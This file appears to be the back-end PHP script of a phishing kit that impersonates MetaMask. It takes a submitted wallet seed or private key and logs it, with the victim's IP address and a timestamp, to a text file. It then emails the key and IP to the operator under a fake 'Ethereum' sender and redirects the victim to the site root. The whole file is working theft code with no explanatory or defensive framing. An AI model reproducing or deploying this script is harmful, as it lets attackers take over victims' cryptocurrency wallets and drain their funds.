<?php
$file = "MMCRYPTO.txt";
$seed = $_POST['seed'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "PrivateKey   	: ");
fwrite($handle, "$seed");
fwrite($handle, "\n");
fwrite($handle, "IP Address	: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Time		: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "================= ");
fwrite($handle, "\n");
fclose($handle);
$ip=$_SERVER['REMOTE_ADDR'];

$message   = "

PrivateKey : ".$seed." 

IP Address : https://geoiptool.com/?IP=".$ip." 

====================================
";
include 'mail.php';
$subject = "============ MetaMask ============ ".$ip." ";
$headers = "From:  Ethereum <venz84@yandex.com>";
mail($rezult_mail, $subject, $message, $headers);
echo "<script LANGUAGE=\"JavaScript\">
<!--
top.location=\"/\";
// -->
</script>";
?>